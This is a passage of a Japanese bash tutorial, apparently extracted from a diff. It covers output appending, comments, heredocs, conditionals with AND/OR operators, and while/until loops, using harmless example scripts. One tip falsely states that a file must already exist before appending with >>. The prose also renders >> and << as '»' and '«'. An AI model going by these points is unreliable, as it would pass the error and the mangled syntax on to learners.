-追記方法は簡単で、&amp;raquo; を使うだけです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:helloScript.sh" data-lang="bash:helloScript.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello, shell script.&amp;#34;&lt;/span> &amp;gt; hello.txt&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;and bash.&amp;#34;&lt;/span> &amp;gt;&amp;gt; hello.txt&lt;span class="p">;&lt;/span> &lt;span class="c1"># ここで追記&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>「&amp;raquo;」をアペンドと言います。&lt;/dd>
-&lt;dd>アペンドするときの注意点は、アペンドする場合は、既にファイルが存在している必要があります。「touch」コマンドでファイルを生成したうえでアペンドするか、あらかじめ「&amp;gt; リダイレクト」でファイルを生成し、文字列を追記したうえで、「&amp;raquo; アペンド」します。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="コメント">コメント&lt;/h2>
-&lt;p>コメントはスクリプトの実行時に無視されます。スクリプトでは、コメントは何もしません。コメントには３つの種類があります。&lt;/p>
-&lt;p>1行のコメント&lt;br>
-複数行のコメント&lt;br>
-HereDoc Delimeter&lt;/p>
-&lt;p>1行のコメントの場合、コメントステートメントの前に「#」記号を半角で書きます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:lineComment.sh" data-lang="bash:lineComment.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="c1"># this is a 1st comment&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript.&amp;#34;&lt;/span> &amp;gt; file.txt&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>コメントを複数行にわたって書きたいことがあります。行頭に「# 」を書けばよいのですが、改行の度に行頭に「# 」を挿入する必要があり、とっても面倒です。&lt;br>
-C 言語やJava、HTMLですらも複数行コメントがあるのに。。。&lt;br>
-シェルスクリプトにもあります。あるんです。みんな知らないだけです。&lt;br>
-最初のコメントの先頭の前に「:'」を置き、最後のコメントの後に「'」と書くことだけです。理解を深めるために、次のスクリプトを調べることができます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:multiComment.sh" data-lang="bash:multiComment.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-:&lt;span class="s1">&amp;#39;
-&lt;/span>&lt;span class="s1">This is the segment of multi-line comments
-&lt;/span>&lt;span class="s1">Through this script, you will learn
-&lt;/span>&lt;span class="s1">How to do multi-line commenting
-&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
-&lt;span class="c1"># this is a 1st comment&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript.&amp;#34;&lt;/span> &amp;gt; file.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>仰々しいマルチラインコメントもあります。&lt;br>
-こちらのマルチラインコメントが使われない理由は、これから紹介するヒアドキュメントの記述方法に似ていてまぎらわしいからです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:multiComment.sh" data-lang="bash:multiComment.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="c1"># 仰々しいマルチラインコメント&lt;/span>
-&lt;span class="s">&amp;lt;&amp;lt;COMMENT
-&lt;/span>&lt;span class="s"> your comment 1
-&lt;/span>&lt;span class="s"> comment 2
-&lt;/span>&lt;span class="s"> blah
-&lt;/span>&lt;span class="s">COMMENT&lt;/span>
-&lt;span class="c1"># シンプルなマルチラインコメント&lt;/span>
-:&lt;span class="s1">&amp;#39;
-&lt;/span>&lt;span class="s1">This is the segment of multi-line comments
-&lt;/span>&lt;span class="s1">Through this script, you will learn
-&lt;/span>&lt;span class="s1">How to do multi-line commenting
-&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
-&lt;span class="c1"># this is a 1st comment&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript.&amp;#34;&lt;/span> &amp;gt; file.txt&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ヒアドキュメントはとてもべんりな出力方法です。&lt;br>
-コメントではありませんが、上記のマルチラインコメントと似ているので、ここでご紹介します。&lt;/p>
-&lt;p>通常、複数の行出力は以下のように記述します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:hereDocuments.sh" data-lang="bash:hereDocuments.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-touch file.txt&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript 1.&amp;#34;&lt;/span> &amp;gt;&amp;gt; file.txt&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript 2.&amp;#34;&lt;/span> &amp;gt;&amp;gt; file.txt&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript 3.&amp;#34;&lt;/span> &amp;gt;&amp;gt; file.txt&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>とっても面倒ですね。&lt;br>
-そこでヒアドキュメントの出番となります。ヒアドキュメントでは以下のように書くことができます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:hereDocuments.sh" data-lang="bash:hereDocuments.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-cat &lt;span class="s">&amp;lt;&amp;lt; EOS
-&lt;/span>&lt;span class="s">Hello,shellscript 1.
-&lt;/span>&lt;span class="s">Hello,shellscript 2.
-&lt;/span>&lt;span class="s">Hello,shellscript 3.
-&lt;/span>&lt;span class="s">EOS&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクリプトを実行すると、次の出力が表示されます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash hereDocuments.sh
-Hello,shellscript 1.
-Hello,shellscript 2.
-Hello,shellscript 3.
-$
-&lt;/code>&lt;/pre>&lt;p>cat の後ろに 「 - ハイフン」を置くと、インデントが有効になります。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:hereDocuments.sh" data-lang="bash:hereDocuments.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-cat &lt;span class="s">&amp;lt;&amp;lt;-EOS
-&lt;/span>&lt;span class="s"> Hello,shellscript 1.
-&lt;/span>&lt;span class="s"> Hello,shellscript 2.
-&lt;/span>&lt;span class="s"> Hello,shellscript 3.
-&lt;/span>&lt;span class="s">EOS&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクリプトを実行すると、次の出力が表示されます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash hereDocuments.sh
-Hello,shellscript 1.
-Hello,shellscript 2.
-Hello,shellscript 3.
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>cat &amp;laquo;-EOS&lt;/dd>
-&lt;dd>(-)ハイフンを置くtipsを忘れずに。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="条件分岐">条件分岐&lt;/h2>
-&lt;p>このトピックでは以下について説明します。&lt;/p>
-&lt;p>ifステートメント&lt;br>
-if-elseステートメント&lt;br>
-if-else ifステートメント&lt;br>
-AND演算子とOR演算子&lt;/p>
-&lt;h3 id="ifステートメント">Ifステートメント&lt;/h3>
-&lt;p>ifセグメントに条件を書き込むには、条件の前後に「[ ]」内に余分なものを与える必要があります。その後、条件コードを述べ、次の行に移動し、「その後」と書き、条件がtrueの場合に実行するコード行を述べます。最後に、ifステートメントを閉じるには「fi」を使用します。以下は、ifステートメントの構文を理解するスクリプトコードの例です。&lt;/p>
-&lt;p>ifステートメントには「[ ]」内に条件を書きます。&lt;br>
-「if」と 「[」の間には半角スペースが必要です。&lt;br>
-また、「[」と条件文、条件文と「]」の間にも半角スペースが必要です。&lt;br>
-ifの終わりには、「fi」で閉じる必要があります。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:if-statements.sh" data-lang="bash:if-statements.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>このスクリプトは変数「カウント」に「10」の値を割り当てます。&lt;br>
-「if」の条件「[ &amp;ldquo;$count&amp;rdquo; -eq 10 ]」は、count変数の値が10と「等しい」かどうかを確認する条件文です。&lt;br>
-この条件がtrueで成立すると、処理は次のステートメントに移動します。&lt;br>
-最後の「fi」は、このif-statementブロックの終了を示すキーワードです。&lt;/p>
-&lt;p>条件が成立しない場合、このプログラムには「else」ブロックがないため、何もしません。&lt;/p>
-&lt;p>次のプログラムは条件が成立しない場合の処理となります。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:ifelse-statements.sh" data-lang="bash:ifelse-statements.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>11&lt;span class="p">;&lt;/span> &lt;span class="c1"># COUNT は 11とする&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is false. count: &lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>このプログラムでは、「$count」変数は11の値で割り当てています。&lt;br>
-この場合、ifブロックの条件が成立しないため、「if」セクション全体を無視して「else」ブロックに移動します。&lt;br>
-端末は、条件がfalseであるというステートメントと$countを表示します。&lt;/p>
-&lt;p>条件を書くための別の形式もあります。&lt;br>
-「[ ]」を「(( ))」括弧に置き換え、それらの間に条件を書き込むだけです。&lt;br>
-C言語、Javaに慣れている人は、この記述方法のほうが直観的かもしれません。&lt;br>
-この形式の例を次に示します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:bracketIfelse-statements.sh" data-lang="bash:bracketIfelse-statements.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>11&lt;span class="p">;&lt;/span> &lt;span class="c1"># COUNT は 11とする&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">((&lt;/span>&lt;span class="nv">count&lt;/span>&lt;span class="o">==&lt;/span>10&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is false count: &lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="if-else-ifステートメント">if-else ifステートメント&lt;/h3>
-&lt;p>スクリプトでif-else ifをステートメントのブロックとして使用すると、プログラムは条件を再チェックします。同様に、以下のサンプルコードを「helloScript.sh」に記述すると、プログラムは最初に「if」条件をチェックすることがわかります。「カウント」変数には「10」の値が割り当てられます。最初の「if」条件では、プログラムは「カウント」が9より大きい値を持っていることを確認します。その後、「if」ブロックに書かれたステートメントが実行され、そこから出てきます。たとえば、「elif」で書かれた条件がtrueの場合、プログラムは「elif」ブロックで書かれたステートメントのみを実行し、ステートメントの「if」および「else」ブロックを無視します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:ifelseif-statements.sh" data-lang="bash:ifelseif-statements.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>8&lt;span class="p">;&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">((&lt;/span>count&amp;gt;9&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the first condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">elif&lt;/span> &lt;span class="o">((&lt;/span>count&amp;lt;&lt;span class="o">=&lt;/span>9&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;then second condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is false&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="and演算子">AND演算子&lt;/h3>
-&lt;p>条件で「AND」演算子を使用するには、条件間で記号「&amp;amp;&amp;amp;」を使用します。&lt;br>
-たとえば、「[ &amp;ldquo;$age&amp;rdquo; -gt 18 ] と [ &amp;ldquo;$age&amp;rdquo; -lt 40 ]をチェックし、年齢が18より大きく、年齢が40未満の場合、これはfalseであることがわかります。プログラムは「その後」の後に書かれたステートメントを無視し、端末に「年齢は正しくない」と印刷して「else」ブロックに向かって移動します&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:andOperator.sh" data-lang="bash:andOperator.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">10&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">18&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>条件を次の形式で書くこともできます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:andOperator2.sh" data-lang="bash:andOperator2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">18&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]]&lt;/span>
-&lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>「&amp;amp;&amp;amp;」の代わりに「-a」を使用して、プログラムの条件でAND演算子を使用することもできます。それは同じように動作します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:andOperator3.sh" data-lang="bash:andOperator3.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">18&lt;/span> -a &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>
-&lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>このコードを「helloScript.sh」スクリプトに保存し、ターミナルから実行します&lt;/p>
-&lt;h3 id="or演算子">OR演算子&lt;/h3>
-&lt;p>2つの条件があり、それらのいずれかまたは両方がtrueの場合、前述のステートメントを実行する場合、OR演算子が使用されます。 「-o」はOR演算子を表すために使用されます。「||」記号を使用することもできます。&lt;br>
-次のサンプルコードを「helloScript.sh」に書き、ターミナルから実行して動作を確認します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator.sh" data-lang="bash:orOperator.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">18&lt;/span> -o &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>OR演算子をよりよく理解するために、さまざまな条件を試すこともできます。以下に４つのサンプルを記します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator1.sh" data-lang="bash:orOperator1.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">18&lt;/span> -o &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator2.sh" data-lang="bash:orOperator2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">18&lt;/span> -o &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator3.sh" data-lang="bash:orOperator3.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">18&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">40&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:orOperator4.sh" data-lang="bash:orOperator4.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">30&lt;/span>
-&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -lt &lt;span class="m">18&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -gt &lt;span class="m">40&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is correct&amp;#34;&lt;/span>
-&lt;span class="k">else&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;age is not correct&amp;#34;&lt;/span>
-&lt;span class="k">fi&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ループ">ループ&lt;/h2>
-&lt;p>このトピックでは、以下の説明をします。&lt;/p>
-&lt;p>whileループ&lt;br>
-until ループ&lt;br>
-for ループ&lt;br>
-break と continue&lt;/p>
-&lt;h3 id="whileループ">whileループ:&lt;/h3>
-&lt;p>ループは条件がtrueの場合にコードブロック(do&amp;hellip;doneで囲まれています)を実行し、条件がfalseになるまでそれを実行し続けます。&lt;/p>
-&lt;p>条件がfalseになると、whileループは終了します。&lt;br>
-whileループは、キーワード「while」から始まり、そのうしろに条件文を書きます。&lt;br>
-条件文を閉じたらキーワード「do」を使用し、プログラムの条件がtrueの場合に実行する処理ステートメントの束を書きます。&lt;br>
-処理ステートメントの終了後、キーワード「done」を書いてwhileループを閉じます。&lt;/p>
-&lt;p>以下、スクリプトを「helloScript.sh」として保存します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:whileLoop.sh" data-lang="bash:whileLoop.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="p">;&lt;/span>
-&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$number&lt;/span> -lt &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nv">number&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$((&lt;/span> number+1 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="k">done&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ターミナルで「$ ./whileLoop.sh」コマンドを使用してスクリプトを実行ます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash whileLoop.sh
-1
-2
-3
-4
-5
-6
-7
-8
-9
-$
-&lt;/code>&lt;/pre>&lt;p>Whileループでは、まず、条件が真かどうかをチェックします。&lt;br>
-条件がfalseの場合、ループから出てプログラムを終了します。&lt;/p>
-&lt;p>条件が true の場合、実行シーケンスはキーワード &amp;lsquo;do&amp;rsquo; の後に書かれたステートメントに移動します。&lt;br>
-上記サンプルのは、「echo」により１から９までが出力されます。&lt;/p>
-&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>ループ自体をループさせるincrementステートメントについて&lt;/dd>
-&lt;dd>$(( )) は、括弧内で計算された値が引き出されます。&lt;/dd>
-&lt;dd>(( )) 内は、変数の冒頭に $ は必要ありません。&lt;/dd>
-&lt;dd>(( )) 内は、四則演算が可能です。スペースを空ける必要もありません。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h3 id="until-ループ">until ループ:&lt;/h3>
-&lt;p>loopが条件がfalseのときにコードブロック(do&amp;hellip;doneで囲まれている)を実行し、条件がtrueになるまで実行し続けるまでループし続け、条件が true になると、until ループは終了します。&lt;br>
-untilループの構文はwhileループの構文と同じで、「while」の代わりに「until」という言葉を使用します。&lt;/p>
-&lt;p>ターミナルで「$ ./untilLoop.sh」コマンドを使用してスクリプトを実行ます。&lt;/p>
